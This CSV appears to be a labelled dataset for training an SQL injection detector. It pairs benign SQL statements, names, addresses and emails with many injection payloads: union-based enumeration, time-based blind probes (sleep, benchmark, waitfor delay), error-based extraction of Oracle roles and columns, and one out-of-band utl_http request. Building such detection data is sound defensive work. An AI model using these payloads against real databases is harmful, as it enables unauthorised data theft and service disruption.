Query,Label
"   SELECT Employees.thick, COUNT ( Orders.bandID )  AS packageFROM    ( OrdersINNER JOIN buried ON Orders.boardID  =  Employees.overID ) ",0
SELECT TOP 50 PERCENT * FROM walk SELECT * FROM shelf FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM proud,0
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1,0
1 and   (  3020  =  3020  )  *6703-- zsnl,1
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",1
SELECT * FROM five WHERE my = 'glad'  OR many = 'mouth',0
"-3461""   )    )    union all select 6342,6342,6342,6342,6342,6342#",1
1'   )    )    as nhkp where 8030  =  8030,1
"calle san isidro labrador 188, 13?h",0
SELECT man ( s )  FROM lunch SELECT breathe ( s ) ,0
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",1
SELECT * FROM he WHERE jungle BETWEEN 'cup' AND 'could',0
myrna5@adondeir.at,0
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",1
SELECT * FROM weak WHERE smaller NOT BETWEEN 'unit' AND 'dear',0
select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,1
-5854   )    )     )   union all select 5645#,1
SELECT AVG ( window )  FROM simply  SELECT SUM ( thick ) ,0
"  SELECT thank AS crew, smooth AS [plan]  FROM met",0
SELECT cheese ( s )  FROM daughter SELECT grass FROM soft,0
1'   )    )     )   and 9198  =  9198--,1
if  (  8727  =  4039  )   select 8727 else drop function giql--,1
1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',1
SELECT * FROM spider WHERE observe IN  ( SELECT girl FROM everything ) ,0
-6145 or   (  8459  =  8459  )  *4906-- yklv,1
1'+  (  select gguu where 7809  =  7809 union all select null--,1
"1   )    )    as wmxa where 6485  =  6485 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
" SELECT column_name ( s )  FROM each,gate",0
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",1
piejo,0
ajuagas,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_2710' LIMIT 1,0
-1769 union all select 6054--,1
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY,0
60210107v,0
18684547z,0
1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,1
danisa,0
%27 or 1  =  1,1
1' in boolean mode  )   union all select null#,1
17240,0
"c/ el breton, 187",0
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",0
1'   )    )    union all select null#,1
SELECT COS ( 2 ) ;,0
belalczar,0
SELECT COUNT ( * )  FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_non\\_library\\_sync\\_1\\_batch\\_%',0
SELECT * FROM good,0
02650843r,0
select case when 8867  =  7630 then 1 else null end--,1
SELECT MIN ( mud )  AS parallel FROM around,0
intxaurraga,0
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",1
1'  )   where 1424  =  1424 and sleep  (  5  )  --,1
villamuera de la cueza,0
bizantina,0
SELECT MIN ( Price )  AS SmallestPriceFROM Products;,0
-1989%'   )    )    or 6179  =  8518#,1
select sleep  (  5   )    )   ||',1
"1%""  )   union all select null,null,null,null,null#",1
crovetto roger,0
84826588n,0
guillen,0
armaanzas,0
40531,0
"1  )   where 7775  =  7775 union all select null,null,null,null--",1
solar,0
SELECT cotton ( s )  FROM column FULL OUTER JOIN,0
"   SELECT growth, ought, finishFROM serve WHERE phrase  IS NOT NULL",0
SELECT joy ( s )  FROM general UNION ALL,0
SELECT find FROM small UNION SELECT lose FROM tears ORDER BY harder,0
"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT COUNT ( equal ) FROM suppose,0
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
1'   )    )    as dago where 9788  =  9788,1
1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
SELECT * FROM route ORDER BY he,0
"   SELECT evening,disappear,planet,pony,plain     (  (  ability JOIN teeth ON beauty.stopped =  high.duty )   INNER JOIN volumeON Orders.bite =  meant.watchID ) ",0
"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1
-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,1
SELECT * FROM wonderful WHERE warn = 'health' LIMIT 3,0
8.32244E+15,0
"   SELECT book,field,front,size,it     (  (  such JOIN forty ON program.movie =  club.equipment )   INNER JOIN oldestON Orders.favorite =  tent.thoseID ) ",0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,1
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rhli",1
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1
SELECT * FROM cave WHERE card BETWEEN '1996-07-01' AND '1996-07-31',0
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,1
"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  """,1
"  SELECT oil,airplane,wool FROM term LEFT JOIN Orders ON shop.nutsID =  in.whenever ORDER BY held.wish",0
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20,0
"  SELECT * FROM sentence WHERE fix NOT IN  ( 'threw', 'social', 'daily' )  ",0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
DELETE FROM basket WHERE increase = 'cotton',0
"-6305""   )    )     )   or 8097  =  2048 and    (    (     (  ""euyy"" like ""euyy",1
select sleep  (  5  )   and   (  '%'  =  ',1
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,1
2.7841E+15,0
"-7868""   )    )    or 9323  =  9323#",1
"INSERT INTO powder  ( tonight, supper, larger )  VALUES  ( 'minute', 'spirit', 'characteristic' )  ",0
SELECT TIME ( NULL ) ;,0
"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1
SELECT * FROM review WHERE torn IN  ( SELECT service FROM invented ) ,0
oseja,0
1   )    )    as pmff where 6649  =  6649,1
1' where 9602  =  9602,1
"  SELECT suitID AS ID, nervous AS store FROM crop",0
FROM  ( SELECT DISTINCT terrible FROM roar ) ,0
dyck,0
" select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",1
SELECT * FROM shelter,0
"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1'  )   and   (  7603  =  3634  )  *3634,1
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",1
d76en3r9n8z01,0
SELECT TOP 50 PERCENT * FROM glass SELECT * FROM camp FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sleep,0
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1
SELECT * FROM can  WHERE widely NOT LIKE '[meant]%',0
" SELECT column_name ( s )  FROM share,sound",0
"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",1
"  SELECT fastened,fall FROM wash WHERE enter = 'play' UNION SELECT seven, block FROM certainly",0
enconadura,0
"  SELECT touch,distant,gun FROM into LEFT JOIN Orders ON hardly.termID =  apart.view ORDER BY forward.discussion",0
SELECT * FROM finish 3 SELECT * FROM pale,0
-2790'   )    )    or 8571  =  8571--,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
1'+  (  select 'lcru' where 3215  =  3215,1
lahnstein agundis,0
psklib,0
SELECT * FROM sport WHERE fighting = 'dropped' LIMIT 3,0
amedee@spainbb.cc,0
berriz,0
"roure, 43, 3?d",0
"   SELECT whether, arrange, problemFROM fear WHERE addition  IS NOT NULL",0
create user name identified by pass123 temporary tablespace temp default tablespace users;,1
SELECT * FROM bat FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM telephone,0
1.34688E+15,0
1'  )   rlike sleep  (  5  ) ,1
SELECT * FROM three ORDER BY dozen DESC,0
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo",1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'  )   as fxid where 5926  =  5926,1
henrikson@hojainformativas.int,0
SELECT * FROM stuck WHERE related = 'serious'  AND City = 'former',0
8n66ies4a,0
modigh,0
"  SELECT IFNULL ( NULL, ""W3Schools.com"" ) ;",0
SELECT COUNT ( dawnID ) FROM block,0
"  SELECT Orders.mostrID, Employees.plenty, Employees.herself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.summerID ORDER BY Orders.fairlyID",0
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT TOP 50 PERCENT * FROM flame SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gun,0
SELECT pictured ( s )  FROM live UNION ALL,0
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM growth WHERE under BETWEEN 'coast' AND 'blank',0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",1
1  )   where 2940  =  2940,1
"1""   )    )    as jucs where 6836  =  6836",1
"-3856""  )   as iyzl where 7394  =  7394 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
07951538r,0
3471,0
itero del castillo,0
"   SELECT COUNT ( pick ) , rope FROM final BY mistake",0
"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",1
||6,1
"1'   )    )    union all select null,null,null,null,null--",1
vilma,0
38980059g,0
" select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
"1  )   union all select null,null,null,null,null,null,null,null,null#",1
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,1
SELECT * FROM  ( SELECT station FROM flew ) ,0
prucha@comerciosaspe.ps,0
SELECT * FROM rise FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM proper,0
1  )   as mtda where 3951  =  3951,1
SELECT bowl ( s )  FROM piano,0
" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1
lap-pun2@streaptease.hk,0
"SELECT customername, contactname FROM  customers; ",0
charlot@ringringrent.rw,0
1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1
granfiel,0
"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",1
SELECT cloth FROM worry UNION SELECT certain FROM wooden ORDER BY young,0
"   SELECT Employees.deer, COUNT ( Orders.villageID )  AS peaceFROM    ( OrdersINNER JOIN hello ON Orders.dinnerID  =  Employees.sickID ) ",0
"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",1
"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",1
SELECT whispered ( s )  FROM care UNION ALL,0
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'xfmq'  =  'xfmq",1
"-1438 where 6759  =  6759 union all select 6759,6759#",1
SELECT * FROM room WHERE tide = 'mighty'  OR plenty = 'of',0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""uhvy""  =  ""uhvy",1
SELECT variety ( s ) FROM choice INNER JOIN,0
10550,0
SELECT * FROM wool WHERE protection  BETWEEN 10 AND 20,0
SELECT * FROM property WHERE unknown = 'outer' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1""  )   as rbgl where 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
brewer,0
SELECT COUNT ( usID ) FROM blind,0
33001,0
SELECT TOP 3 * FROM perhaps WHERE coming = 'telephone' SELECT * FROM nearest,0
hus24lero,0
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",1
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1
SELECT * FROM upper WHERE strip NOT LIKE 'steady%',0
"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"calle hostieros, 24",0
-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1
1'  )   where 5286  =  5286,1
SELECT * FROM goose WHERE chamber BETWEEN am09/01/1996fight AND active15/31/1996boat,0
select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,1
1   )    )    or pg_sleep  (  __TIME__  )  --,1
"1%' and make_set  (  1227  =  5627,5627  )   and '%'  =  '",1
SELECT being FROM call UNION SELECT himself FROM taken ORDER BY income,0
diezma,0
49211,0
SELECT * FROM walk WHERE poetry NOT LIKE '[television]%',0
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",1
"  SELECT * FROM shaking WHERE them IN  ( 'prevent', 'coach', 'writer' )  ",0
35210254z,0
SELECT * FROM hide WHERE secret = 'careful' FETCH FIRST 3 ROWS ONLY,0
moskuna@sitcpla.ye,0
tejeda y segoyuela,0
SELECT TOP 50 PERCENT * FROM piano,0
1 or sleep  (  5  ) ,1
"   SELECT COUNT ( atom ) , consonant FROM basket BY shinning",0
3o7za732,0
" SELECT column_name ( s )  FROM wall,sides",0
SELECT wide ( s )  FROM west,0
pampanas soto,0
   (  select top 1,1
3.6585E+15,0
rigoberta menchu 184 10?d,0
"INSERT INTO six  ( solid, automobile, wore )  VALUES  ( 'hope', 'leather', 'smallest' )  ",0
34310,0
select   (  case when   (  5796  =  8326  )   then 5796 else 5796*  (  select 5796 from information_schema.character_sets  )   end  )  #,1
veracruz,0
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh",1
"1  )   union all select null,null,null,null--",1
hache6,0
